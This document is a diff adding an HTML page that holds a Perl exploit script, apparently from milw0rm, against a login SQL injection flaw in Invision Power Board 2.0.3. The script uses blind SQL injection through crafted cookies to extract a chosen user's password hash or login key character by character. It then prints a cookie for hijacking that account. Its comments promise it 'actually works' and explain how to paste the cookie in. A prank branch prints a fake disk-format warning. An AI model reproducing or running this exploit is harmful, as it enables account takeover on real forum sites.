@@ -1,0 +1,67 @@
+<html><head><title>Invision Power Board <= 2.0.3 Login.PHP SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
+##################################################################
+# This one actually works :) Just paste the outputted cookie into
+# your request header using livehttpheaders or something and you
+# will probably be logged in as that user. No need to decrypt it!
+# Exploit coded by &quot;Tony Little Lately&quot; and &quot;Petey Beege&quot;
+##################################################################
+
+use LWP::UserAgent;
+
+   $ua = new LWP::UserAgent;
+   $ua-&gt;agent(&quot;Mosiac 1.0&quot; . $ua-&gt;agent);
+
+if (!$ARGV[0]) {$ARGV[0] = '';}
+if (!$ARGV[3]) {$ARGV[3] = '';}
+
+my $path = $ARGV[0] . '/index.php?act=Login&amp;CODE=autologin';
+my $user = $ARGV[1];   # userid to jack
+my $iver = $ARGV[2];   # version 1 or 2
+my $cpre = $ARGV[3];   # cookie prefix
+my $dbug = $ARGV[4];   # debug?
+
+if (!$ARGV[2])
+{
+        print &quot;The type of the file system is NTFS.\n\n&quot;;
+        print &quot;WARNING, ALL DATA ON NON-REMOVABLE DISK\n&quot;;
+        print &quot;DRIVE C: WILL BE LOST!\n&quot;;
+        print &quot;Proceed with Format (Y/N)?\n&quot;;
+        exit;
+}
+
+my @charset = (&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;);
+
+my $outputs = '';
+
+for( $i=1; $i &lt; 33; $i++ )
+{
+        for( $j=0; $j &lt; 16; $j++ )
+        {
+                my $current = $charset[$j];
+            my $sql = ( $iver &lt; 2 ) ?  &quot;99%2527+OR+(id%3d$user+AND+MID(password,$i,1)%3d%2527$current%2527)/*&quot; :
+&quot;99%2527+OR+(id%3d$user+AND+MID(member_login_key,$i,1)%3d%2527$current%2527)/*&quot;;
+                my @cookie = ('Cookie' =&gt; $cpre . &quot;member_id=31337420; &quot; . $cpre . &quot;pass_hash=&quot; . $sql);
+                my $res = $ua-&gt;get($path, @cookie);
+
+                # If we get a valid sql request then this
+                # does not appear anywhere in the sources
+                $pattern = '&lt;title&gt;(.*)Log In(.*)&lt;/title&gt;';
+
+                $_ = $res-&gt;content;
+
+                if ($dbug) { print };
+
+                if ( !(/$pattern/) )
+                {
+                        $outputs .= $current;
+                        print &quot;$current\n&quot;;
+                    last;
+                }
+
+        }
+  if ( length($outputs) &lt; 1 )   { print &quot;Not Exploitable!\n&quot;; exit;     }
+}
+print &quot;Cookie: &quot; . $cpre . &quot;member_id=&quot; . $user . &quot;;&quot; . $cpre . &quot;pass_hash=&quot; . $outputs;
+exit;
+
+# milw0rm.com [2005-05-26]</pre></html>
